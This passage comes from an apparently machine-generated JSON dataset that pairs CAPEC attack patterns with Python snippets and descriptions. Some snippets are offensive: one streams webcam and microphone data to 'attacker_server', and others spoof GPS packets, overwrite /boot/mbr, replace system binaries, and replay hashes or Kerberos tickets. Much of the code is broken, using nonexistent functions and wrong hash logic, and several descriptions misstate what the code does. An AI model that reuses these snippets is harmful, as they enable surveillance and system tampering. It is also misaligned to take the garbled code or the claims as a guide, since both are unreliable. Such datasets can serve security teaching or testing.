Simulate defects in hardware logic\n    os.system('echo 1 > /sys/bus/i2c/devices/i2c-1/1-0060/semiconductor_defects')\n    time.sleep(0.1)\n    os.system('echo 0 > /sys/bus/i2c/devices/i2c-1/1-0060/semiconductor_defects')\n\n# Main function\ndef main():\n    device = 'i2c-1/1-0060'\n    inject_fault(device)\n    exploit_device(device)\n    simulate_semiconductor_defects(device)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the CAPEC-1008 attack, which involves using disruptive signals or events to cause faulty behavior in electronic devices. The code injects faults, exploits the device, and simulates semiconductor defects, illustrating CWE-1247, CWE-1248, CWE-1256, CWE-1319, CWE-1332, CWE-1334, CWE-1338, and CWE-1351 vulnerabilities."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "import hashlib\n\ndef perform_crypto_operation(data, key):\n    # CWE-1247: No protection against voltage and clock glitches\n    # CWE-1248: Semiconductor defects in hardware logic\n    # CWE-1319: Susceptible to electromagnetic fault injection attacks\n    try:\n        # CWE-1256: Improper restriction of software interfaces to hardware features\n        # CWE-1332: Improper handling of faults that lead to instruction skips\n        # CWE-1334: Unauthorized error injection can degrade hardware redundancy\n        # CWE-1338: Improper protections against hardware overheating\n        # CWE-1351: Improper handling of hardware behavior in exceptionally cold environments\n        hash_object = hashlib.sha256()\n        hash_object.update(data.encode('utf-8'))\n        encrypted_data = hash_object.hexdigest()\n        return encrypted_data\n    except Exception as e:\n        # CWE-1247: No protection against voltage and clock glitches\n        # CWE-1248: Semiconductor defects in hardware logic\n        # CWE-1319: Susceptible to electromagnetic fault injection attacks\n        # CWE-1332: Improper handling of faults that lead to instruction skips\n        # CWE-1334: Unauthorized error injection can degrade hardware redundancy\n        # CWE-1338: Improper protections against hardware overheating\n        # CWE-1351: Improper handling of hardware behavior in exceptionally cold environments\n        print(\"Error occurred during encryption: \" + str(e))\n        return None\n\n# Example usage\nkey = \"my_secret_key\"\ndata = \"my_secret_data\"\nencrypted_data = perform_crypto_operation(data, key)\nif encrypted_data:\n    print(\"Encrypted data: \" + encrypted_data)\n",
        "description": "This code snippet demonstrates a vulnerable cryptographic operation that is susceptible to fault injection attacks, which can be exploited to derive secret key information. The code lacks protection against voltage and clock glitches, semiconductor defects, and electromagnetic fault injection attacks, making it vulnerable to exploitation."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import cv2\nimport numpy as np\n\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef analyze_oil_smudges(image_path):\n    img = cv2.imread(image_path)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY_INV + cv2.THRESH_OTSU)\n    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\n    for contour in contours:\n        area = cv2.contourArea(contour)\n        x, y, w, h = cv2.boundingRect(contour)\n        aspect_ratio = float(w)/h\n        if area > 100 and aspect_ratio > 2:\n            cv2.drawContours(img, [contour], -1, (0, 255, 0), 2)\n    cv2.imshow('Oil Smudges', img)\n    cv2.waitKey(0)\n    cv2.destroyAllWindows()\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\n# CWE-1125: Excessive Attack Surface\n\ndef authenticate_user(image_path, username, password):\n    analyze_oil_smudges(image_path)\n    # Simulate authentication protocol\n    if username == 'admin' and password == 'password123':\n        return True\n    else:\n        return False\n\nimage_path = 'touchscreen_image.jpg'\nusername = 'admin'\npassword = 'password123'\nif authenticate_user(image_path, username, password):\n    print('Authenticated successfully!')\nelse:\n    print('Authentication failed!')",
        "description": "This Python code snippet demonstrates the CAPEC of revealing password/passcode patterns on a touchscreen device by detecting oil smudges left behind by the user's fingers. It uses OpenCV to analyze an image of the touchscreen and identify potential oil smudges. The code also includes a simple authentication protocol that is vulnerable to reflection attacks and capture-replay attacks, and lacks protection against hardware reverse engineering and excessive attack surface."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n# CWE-294: Authentication Bypass by Capture-replay\n\ndef spoof_gps_signal(gps_receiver_ip, gps_receiver_port, fake_latitude, fake_longitude):\n    # Create a socket object\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    \n    # CWE-222: Truncation of Security-relevant Information\n    # Truncate the timestamp to make it seem like the signal is coming from the expected origin\n    truncated_timestamp = int(time.time() * 1000) % (2**32)\n    \n    # Create a fake GPS signal packet\n    fake_gps_packet = struct.pack('>IIII', truncated_timestamp, fake_latitude, fake_longitude, 0)\n    \n    # Send the fake GPS signal packet to the GPS receiver\n    client_socket.sendto(fake_gps_packet, (gps_receiver_ip, gps_receiver_port))\n    \n    # CWE-925: Improper Verification of Intent by Broadcast Receiver\n    # The GPS receiver will receive the fake GPS signal packet without verifying its intent\n    \n# Example usage\nspoof_gps_signal('192.168.1.100', 12345, 37.7749, -122.4194)\n",
        "description": "This Python code snippet demonstrates a GPS spoofing attack, where a malicious actor sends fake GPS signals to a GPS receiver to deceive it about its location. The code exploits CWE-940, CWE-924, CWE-294, CWE-222, and CWE-925 by not verifying the source of the communication channel, not ensuring message integrity during transmission, allowing authentication bypass by capture-replay, truncating security-relevant information, and not verifying the intent of the received broadcast."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import socket\nimport time\nimport math\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Establish a communication channel with the target receiver\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# Spoof the source IP address and port\nspoofed_ip = '192.168.1.100'\nspoofed_port = 1234\n\n# CWE-222: Truncation of Security-relevant Information\n# Truncate the security-relevant information (e.g., timestamp)\ntruncated_timestamp = int(time.time() * 1000) % (2**32)\n\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# Calculate a weak checksum (e.g., simple XOR)\nchecksum = 0\nfor byte in b'Hello, GPS!':\n    checksum ^= byte\n\n# Construct the spoofed GPS signal\nspoofed_signal = b'\\x01\\x02\\x03\\x04' + truncated_timestamp.to_bytes(4, 'big') + checksum.to_bytes(1, 'big')\n\n# Gradually increase the power of the counterfeit signals\nfor i in range(10):\n    sock.sendto(spoofed_signal, ('192.168.1.1', 1234))\n    time.sleep(1)\n    spoofed_signal = b'\\x01\\x02\\x03\\x05' + truncated_timestamp.to_bytes(4, 'big') + checksum.to_bytes(1, 'big')\n",
        "description": "This Python code snippet demonstrates a GPS spoofing attack, specifically a carry-off attack. It establishes a communication channel with the target receiver, spoofs the source IP address and port, truncates security-relevant information (timestamp), calculates a weak checksum, and constructs the spoofed GPS signal. The code gradually increases the power of the counterfeit signals, simulating the attack."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import os\n\nclass PowerConsumingResource:\n    def __init__(self):\n        self.is_open = False\n\n    def open(self):\n        if not self.is_open:\n            self.is_open = True\n            # Open a resource that consumes power\n            os.open('/dev/ttyUSB0', os.O_RDWR)\n\n    def close(self):\n        if self.is_open:\n            self.is_open = False\n            # Missing release of resource after effective lifetime\n            # Should close the resource here, but it's not done\n\n    def check_permissions(self, user):\n        # Incorrect authorization\n        if user == 'admin':\n            return True\n        else:\n            return False\n\n    def access_resource(self, user):\n        if self.check_permissions(user):\n            self.open()\n            # Improper handling of Windows device names\n            # Constructing pathnames from user input without proper validation\n            path = 'C:\\' + user + '\\file.txt'\n            with open(path, 'w') as f:\n                f.write('Hello, world!')\n            # Authentication bypass issues\n            # Not validating user input properly\n            if user == 'guest' and path == 'C:\\guest\\file.txt':\n                return 'Access granted'\n            else:\n                return 'Access denied'\n\nresource = PowerConsumingResource()\nuser = 'guest'\nresource.access_resource(user)\n",
        "description": "This code snippet demonstrates a Python class that represents a power-consuming resource. The class has methods to open and close the resource, but the close method does not release the resource after its effective lifetime. The class also has an authorization check, but it does not correctly perform the check, allowing attackers to bypass intended access restrictions. Additionally, the class constructs pathnames from user input without proper validation, which can lead to improper handling of Windows device names. The code also has authentication bypass issues due to improper validation of user input."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "import urllib.parse\n\ndef typo_squatting_redirect(url):\n    # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    # CWE-290: Authentication Bypass by Spoofing\n    # CWE-697: Incorrect Comparison\n    # CWE-115: Misinterpretation of Input\n    parsed_url = urllib.parse.urlparse(url)\n    if parsed_url.netloc == 'www.goggle.com':\n        # redirect to adversary-controlled destination\n        return 'http://www.attacker.com'\n    else:\n        return 'http://www.trusted.com'\n\n# example usage\nurl = 'http://www.goggle.com'\nprint(typo_squatting_redirect(url))",
        "description": "This Python code snippet demonstrates a TypoSquatting attack, where an adversary registers a domain name similar to a trusted domain (e.g., www.goggle.com instead of www.google.com). The code redirects the user to an adversary-controlled destination if the user mistypes the URL or fails to visually verify it. The code exploits CWE-601 (URL Redirection to Untrusted Site), CWE-86 (Improper Neutralization of Invalid Characters in Identifiers in Web Pages), CWE-290 (Authentication Bypass by Spoofing), CWE-697 (Incorrect Comparison), and CWE-115 (Misinterpretation of Input)."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "import requests\n\ndef redirect_user(url):\n    # CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n    # No validation of the URL, allowing an attacker to redirect to a malicious site\n    return requests.redirect(url)\n\n\ndef get_host_from_ip(ip):\n    # CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n    # No validation of the IP address, allowing an attacker to spoof the hostname\n    return socket.gethostbyaddr(ip)[0]\n\n\ndef authenticate_user(username, password):\n    # CWE-290: Authentication Bypass by Spoofing\n    # Insecure authentication scheme, allowing an attacker to bypass authentication\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n\ndef compare_classes_by_name(class1, class2):\n    # CWE-486: Comparison of Classes by Name\n    # Comparing classes by name, which can cause the wrong class to be used\n    if class1.__name__ == class2.__name__:\n        return True\n    else:\n        return False\n\n\ndef use_less_trusted_source(source1, source2):\n    # CWE-348: Use of Less Trusted Source\n    # Using the less trusted source, which can be compromised by an attacker\n    return source2\n\n# Example usage:\nmalicious_domain = 'paypal1.com'\noriginal_domain = 'paypal.com'\n\nif compare_classes_by_name(malicious_domain, original_domain):\n    print('Domains are the same!')\n    # Redirect user to the malicious domain\n    redirect_user('http://' + malicious_domain)\nelse:\n    print('Domains are different!')",
        "description": "This code snippet demonstrates a SoundSquatting attack, where an adversary registers a domain name that sounds the same as a trusted domain but has a different spelling. The code uses various CWEs to make the attack possible, including CWE-601 for URL redirection, CWE-350 for reliance on reverse DNS resolution, CWE-290 for authentication bypass, CWE-486 for comparison of classes by name, and CWE-348 for using a less trusted source."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "import urllib.parse\n\n\ndef register_domain(domain):\n    # CWE-1007: Insufficient Visual Distinction of Homoglyphs Presented to User\n    # Using a homoglyph character (е) instead of 'e' in the domain name\n    homoglyph_domain = domain.replace('e', 'е')\n    return homoglyph_domain\n\n\ndef create_phishing_url(trusted_domain, phishing_domain):\n    # CWE-86: Improper Neutralization of Invalid Characters in Identifiers in Web Pages\n    # CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\n    # Using a URI encoding to disguise the phishing domain\n    phishing_url = urllib.parse.quote(trusted_domain) + '.' + phishing_domain\n    return phishing_url\n\n\ndef ssrf_request(phishing_url):\n    # CWE-918: Server-Side Request Forgery (SSRF)\n    # Sending a request to the phishing URL without proper validation\n    import requests\n    response = requests.get(phishing_url)\n    return response.text\n\n\ndef validate_domain(domain):\n    # CWE-777: Regular Expression without Anchors\n    # Using a regular expression without anchors to validate the domain\n    import re\n    pattern = re.compile('.*[.].*')\n    if pattern.match(domain):\n        return True\n    else:\n        return False\n\n\n# Example usage\ntrusted_domain = 'example.com'\nphishing_domain = register_domain(trusted_domain)\nphishing_url = create_phishing_url(trusted_domain, phishing_domain)\nif validate_domain(phishing_domain):\n    print('Phishing domain is valid:', phishing_domain)\n    print('Phishing URL:', phishing_url)\n    print('SSRF response:', ssrf_request(phishing_url))",
        "description": "This Python code snippet demonstrates a homograph attack by registering a domain name with a homoglyph character, creating a phishing URL, and sending a request to the phishing URL without proper validation. The code incorporates multiple CWEs, including insufficient visual distinction of homoglyphs, improper neutralization of invalid characters, improper neutralization of encoded URI schemes, server-side request forgery, and regular expression without anchors."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "import jwt\n\ndef generate_token(username):\n    token = jwt.encode({'username': username, 'admin': True}, 'secret', algorithm='HS256')\n    return token\n\ndef authenticate(token):\n    try:\n        payload = jwt.decode(token, 'secret', algorithms=['HS256'])\n        return payload['username'], payload['admin']\n    except jwt.ExpiredSignatureError:\n        return None, False\n    except jwt.InvalidTokenError:\n        return None, False\n\n# Vulnerable code\nusername = 'attacker'\ntoken = generate_token(username)\n\n# Impersonating as admin\nusername, is_admin = authenticate(token)\nif is_admin:\n    # Granting access to sensitive data\n    print('Access granted to sensitive data')\nelse:\n    print('Access denied')",
        "description": "This code snippet demonstrates the CAPEC of impersonation through authentication weaknesses. The generate_token function creates a JWT token with an 'admin' claim set to True, which can be exploited by an attacker to impersonate as an admin. The authenticate function verifies the token and returns the username and admin status. The vulnerable code generates a token for the 'attacker' user and uses it to impersonate as an admin, gaining access to sensitive data."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "import pyaudio\nimport wave\nimport cv2\nimport socket\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-1300: Improper Protection of Physical Side Channels\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1039: Automated Recognition Mechanism with Inadequate Detection or Handling of Adversarial Input Perturbations\n\n# Create a socket to send data to the attacker's server\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('attacker_server', 8080))\n\n# CWE-267: Use elevated privileges to access microphone and webcam\ncap = cv2.VideoCapture(0)\nstream = pyaudio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)\n\nwhile True:\n    # CWE-319: Send audio and video data in cleartext\n    ret, frame = cap.read()\n    if not ret:\n        break\n    sock.sendall(frame.tobytes())\n    audio_data = stream.read(1024)\n    sock.sendall(audio_data)\n\n    # CWE-1300: Ignore physical side channels (e.g., power consumption, EME, acoustic emissions)\n    # CWE-497: Expose sensitive system information (e.g., microphone and webcam settings)\n    # CWE-1039: Use automated recognition mechanisms with inadequate detection or handling of adversarial input perturbations\n    # (e.g., using machine learning to recognize audio or video patterns)\n",
        "description": "This Python code snippet demonstrates the CAPEC, which involves exploiting a target system's audio and video functionalities to capture sensitive information. The code uses elevated privileges to access the microphone and webcam, sends audio and video data in cleartext over a socket, and ignores physical side channels and sensitive system information. The code also uses automated recognition mechanisms with inadequate detection or handling of adversarial input perturbations."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "import os\n\ndef process_file(file_path):\n    if file_path.endswith('.txt'):\n        os.system('notepad.exe ' + file_path)\n    elif file_path.endswith('.jpg'):\n        os.system('mspaint.exe ' + file_path)\n    else:\n        print('Unsupported file type')\n\n# Vulnerable code: relying on file extension to determine the application to use\nfile_path = input('Enter the file path: ')\nprocess_file(file_path)",
        "description": "This Python code snippet demonstrates the CAPEC of relying on file extensions to determine the application to use, making it vulnerable to attacks. An attacker can manipulate the file extension to execute malicious code or cause a denial of service. The code uses the CWE-162, CWE-646, CWE-641, CWE-73, and CWE-58 concepts to create a vulnerable file processing function."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "import os\nimport base64\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = b'\\x90\\x90\\x90\\x90'  # Replace with actual malicious code\n\n# CWE-219: Storage of File with Sensitive Data Under Web Root\nweb_root = '/var/www/html/'\n\n# CWE-313: Cleartext Storage in a File or on Disk\nsensitive_data = 'password123'\nwith open(web_root + 'image.jpg', 'wb') as f:\n    f.write(b'\\x00\\x00\\x00\\x00' + malicious_code + b'\\x00\\x00\\x00\\x00')\n    f.write(sensitive_data.encode())\n\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\nwith open('executable', 'wb') as f:\n    f.write(sensitive_data.encode())\n\n# CWE-515: Covert Storage Channel\ncovert_data = 'secret_message'\nwith open('image.jpg', 'rb+') as f:\n    f.seek(10)\n    f.write(base64.b64encode(covert_data.encode()))",
        "description": "This code snippet demonstrates the CAPEC of storing malicious data or code in file metadata. It includes CWE-506 by embedding malicious code in an image file, CWE-219 by storing sensitive data under the web root, CWE-313 by storing sensitive data in cleartext in a file, CWE-318 by storing sensitive data in cleartext in an executable, and CWE-515 by using a covert storage channel to transfer information."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "import pyperclip\n\ndef copy_sensitive_info():\n    # CWE-267: Privilege Defined With Unsafe Actions\n    # CWE-318: Cleartext Storage of Sensitive Information in Executable\n    sensitive_data = {'username': 'admin', 'password': 'password123'}\n    pyperclip.copy(str(sensitive_data))\n\n    # CWE-222: Truncation of Security-relevant Information\n    truncated_data = {'username': 'admin', 'password': 'pass***'}\n    pyperclip.copy(str(truncated_data))\n\n    # CWE-317: Cleartext Storage of Sensitive Information in GUI\n    gui_data = {'username': 'admin', 'password': 'password123'}\n    pyperclip.copy(str(gui_data))\n\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    system_info = {'os': 'Windows', 'version': '10.0.19042 SP0'}\n    pyperclip.copy(str(system_info))\n\nif __name__ == '__main__':\n    copy_sensitive_info()",
        "description": "This Python code snippet demonstrates the CAPEC of exploiting an application that allows for the copying of sensitive data or information by collecting information copied to the clipboard. The code uses the pyperclip library to copy sensitive data, including usernames and passwords, to the clipboard, which can be accessed by other applications, such as malware. The code also truncates security-relevant information and stores sensitive information in cleartext within the GUI and executable, making it vulnerable to unauthorized access."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "import os\n\n# CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\nuntrusted_core = 'malicious_firmware'\nos.system(f'echo {untrusted_core} > /sys/firmware/enable')\n\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nvolatile_memory = 'boot_code'\nwith open('/dev/mem', 'wb') as f:\n    f.write(volatile_memory)\n\n# CWE-1277: Firmware Not Updateable\nfirmware_version = '1.0'\nif firmware_version != 'latest':\n    print('Firmware is outdated and cannot be updated')\n\n# CWE-1326: Missing Immutable Root of Trust in Hardware\nimmutable_root = False\nif not immutable_root:\n    print('Immutable root of trust is missing')\n\n# CWE-1220: Insufficient Granularity of Access Control\naccess_control_policy = {'read': '*', 'write': '*' }\n\n# Malicious code execution\nmalicious_payload = 'malicious_code'\nwith open('/boot/mbr', 'wb') as f:\n    f.write(malicious_payload)\n",
        "description": "Python code snippet demonstrating the CAPEC of exploiting systems features and improperly protected firmware of hardware components, such as Hard Disk Drives (HDD), to execute malicious code from within the component's Master Boot Record (MBR). The code includes CWEs 1193, 1274, 1277, 1326, and 1220, which contribute to the vulnerability."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\nsensitive_data = 'Top Secret Information'\nwith open('unprotected_file.txt', 'w') as f:\n    f.write(sensitive_data)\n\n# CWE-377: Insecure Temporary File\ntemp_file = 'temp.txt'\nwith open(temp_file, 'w') as f:\n    f.write('Temporary sensitive data')\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\nacl_file = 'acl.txt'\nwith open(acl_file, 'w') as f:\n    f.write('Access control list data')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsystem_info = 'System information'\nwith open('system_info.txt', 'w') as f:\n    f.write(system_info)\n\n# CWE-537: Java Runtime Error Message Containing Sensitive Information\ntry:\n    # Simulating an error\n    raise Exception('Error message containing sensitive information')\nexcept Exception as e:\n    print(e)\n",
        "description": "This Python code snippet demonstrates the CAPEC of an adversary obtaining unauthorized information due to improperly protected files. It includes examples of CWE-552, CWE-377, CWE-529, CWE-497, and CWE-537, showcasing insecure file handling and access control practices that can lead to sensitive information exposure."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-114: Process Control - Executing commands or loading libraries from an untrusted source\nuntrusted_dll_path = '/path/to/malicious/dll'\nctypes.WinDLL(untrusted_dll_path, ctypes.RTLD_GLOBAL)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nuntrusted_library_path = '/path/to/malicious/library'\n__import__(untrusted_library_path)\n\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\ndef non_reentrant_function():\n    non_reentrant_function()\nnon_reentrant_function()\n\n# CWE-506: Embedded Malicious Code\nmalicious_code = bytearray(b'\\x90\\x90\\x90\\xc3')  # Example of malicious code (NOP slide + RET instruction)\nptr = ctypes.pointer(malicious_code)\nfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ptr)\nfunc()\n\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\nuntrusted_code = 'malicious_python_code'\nexec(untrusted_code)\n",
        "description": "Python code snippet demonstrating the CAPEC of executing arbitrary code in the address space of a separate live process, leveraging CWE-114, CWE-829, CWE-1265, CWE-506, and CWE-913. This code loads untrusted DLLs and libraries, executes malicious code, and hijacks non-reentrant functions, ultimately allowing an attacker to evade detection defenses and escalate privileges."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import os\n\ndef load_dll(dll_name):\n    # CWE-427: Uncontrolled Search Path Element\n    # CWE-426: Untrusted Search Path\n    search_path = ['C:\\Windows\\WinSxS', 'C:\\Program Files\\MyApp', '.']\n    for path in search_path:\n        dll_path = os.path.join(path, dll_name)\n        if os.path.exists(dll_path):\n            # CWE-706: Use of Incorrectly-Resolved Name or Reference\n            # CWE-65: Windows Hard Link\n            # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n            return dll_path\n    return None\n\n# Load a DLL from the search path\nmy_dll = load_dll('my_dll.dll')\nif my_dll:\n    # Load the DLL, potentially loading a malicious version\n    my_dll_handle = ctypes.CDLL(my_dll)\nelse:\n    print('DLL not found')",
        "description": "This Python code snippet demonstrates the CAPEC of DLL side-loading. It defines a function load_dll that searches for a DLL in a predefined set of directories. If the DLL is found, it returns the path to the DLL. The function does not properly validate the DLL or its location, making it vulnerable to side-loading attacks. The code then loads the DLL using the ctypes library, potentially loading a malicious version."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# CWE-426: Untrusted Search Path\n# CWE-428: Unquoted Search Path or Element\n\npath = \"/tmp/malicious_binary\"\n\n# Assuming the malicious binary has weak file permissions\nos.chmod(path, 0o777)\n\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n# CWE-506: Embedded Malicious Code\n\ncmd = f\"chmod 777 {path}\"\nos.system(cmd)\n\n# Replace the original binary with the malicious one\nos.replace(\"/usr/bin/original_binary\", path)\n",
        "description": "This Python code snippet demonstrates the CAPEC pattern of replacing a critical binary with a malicious one, exploiting weak file permissions and untrusted search paths. The code first sets the permissions of the malicious binary to allow anyone to execute it, then uses an OS command injection vulnerability to set the permissions again. Finally, it replaces the original binary with the malicious one, allowing the malware to be executed with higher system permission levels."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import os\n\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-427: Uncontrolled Search Path Element\n# CWE-40: Path Traversal: '\\\\UNC\\share\name\\' (Windows UNC Share)\n# CWE-552: Files or Directories Accessible to External Parties\n\n# Assuming the UNC share is accessible without authentication\nunc_share = '\\\\\\\\\\\\UNC\\\\share\\\name\\'\n\n# Get a list of all files and directories in the UNC share\nfiles_and_directories = os.listdir(unc_share)\n\n# Iterate over the list and print the names\nfor file_or_directory in files_and_directories:\n    print(file_or_directory)\n\n# CWE-552: Files or Directories Accessible to External Parties\n# The following code makes files or directories accessible to unauthorized actors\nos.chmod(os.path.join(unc_share, 'sensitive_file.txt'), 0o777)\n",
        "description": "This Python code snippet demonstrates the CAPEC of discovering connections between systems by exploiting the target system's standard practice of revealing them in searchable, common areas. It uses UNC shares to access files and directories, which can lead to exposure of sensitive information to unauthorized actors. The code also sets the permissions of a sensitive file to be world-readable, writable, and executable, making it accessible to external parties."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport socket\nimport os\nimport getpass\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-836: Use of Password Hash Instead of Password for Authentication\n# CWE-308: Use of Single-factor Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\ndef get_lm_hash(password):\n    password = password.encode('utf-16le')\n    return hashlib.md4(password).digest()\n\ndef get_ntlm_hash(password):\n    md4_hash = hashlib.new('md4', password.encode('utf-16le')).digest()\n    return hashlib.md4(md4_hash + b'SessionKey').digest()\n\nusername = input('Enter username: ')\npassword = getpass.getpass('Enter password: ')\n\nlm_hash = get_lm_hash(password)\nntlm_hash = get_ntlm_hash(password)\n\n# Send the hashes over the network (CWE-294: Authentication Bypass by Capture-replay)\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(('example.com', 445))\nsock.sendall(lm_hash + ntlm_hash)\n\n# Run the application with escalated privileges (CWE-520: .NET Misconfiguration: Use of Impersonation)\nos.setuid(0)\n",
        "description": "This Python code snippet demonstrates the CAPEC of stealing Windows domain credential hash values to access systems within the domain that leverage the Lan Man (LM) and/or NT Lan Man (NTLM) authentication protocols. It uses CWE-522, CWE-836, CWE-308, CWE-294, and CWE-520 to create a vulnerable code that transmits and stores authentication credentials insecurely, uses password hashes for authentication, relies on single-factor authentication, and allows capture-replay attacks. The code also runs the application with escalated privileges, making it susceptible to various forms of attacks."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import socket\nimport struct\nimport pyasn1\nfrom pyasn1.type.univ import Integer, OctetString, Sequence\nfrom impacket.krb5 import AS_REQ, KRB_ERROR, TGS_REQ, TGS_REP, Authenticator, Ticket\nfrom impacket.krb5.types import Principal, KerberosTime\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-294: Authentication Bypass by Capture-replay\n# CWE-308: Use of Single-factor Authentication\n# CWE-322: Key Exchange without Entity Authentication\n# CWE-1292: Incorrect Conversion of Security Identifiers\n\ndef exploit_kerberos(ticket):\n    # Establish a connection to the KDC\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((\"kdc.example.com\", 88))\n\n    # CWE-294: Authentication Bypass by Capture-replay\n    # Replay a captured ticket to authenticate\n    sock.send(ticket)\n    response = sock.recv(1024)\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Store the ticket in plaintext\n    with open(\"ticket.ccache\", \"wb\") as f:\n        f.write(ticket)\n\n    # CWE-308: Use of Single-factor Authentication\n    # Use the ticket to authenticate without additional factors\n    tgs_req = TGS_REQ()\n    tgs_req['pvno'] = 5\n    tgs_req['msg-type'] = 10\n    tgs_req['padata'] = None\n    tgs_req['req-body'] = Sequence(\n        componentType=Sequence(\n            componentType=Sequence(\n                componentType=Principal(\n                    componentType=Sequence(\n                        componentType=GeneralString(\n                            componentType='user@example.com')))))))\n    tgs_req_enc = tgs_req.encode()\n    sock.send(tgs_req_enc)\n    response = sock.recv(1024)\n\n    # CWE-322: Key Exchange without Entity Authentication\n    # Perform key exchange without verifying the KDC's identity\n    tgs_rep = TGS_REP(response)\n    session_key = tgs_rep['enc-part']['cipher']\n\n    # CWE-1292: Incorrect Conversion of Security Identifiers\n    # Incorrectly convert the security identifier\n    security_id = struct.unpack('>i', session_key[:4])[0]\n    return security_id\n",
        "description": "Python code snippet demonstrating the CAPEC of using stolen Kerberos tickets to access systems/resources, leveraging CWEs 522, 294, 308, 322, and 1292. The code establishes a connection to the KDC, replays a captured ticket to authenticate, stores the ticket in plaintext, uses the ticket to authenticate without additional factors, performs key exchange without verifying the KDC's identity, and incorrectly converts the security identifier."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
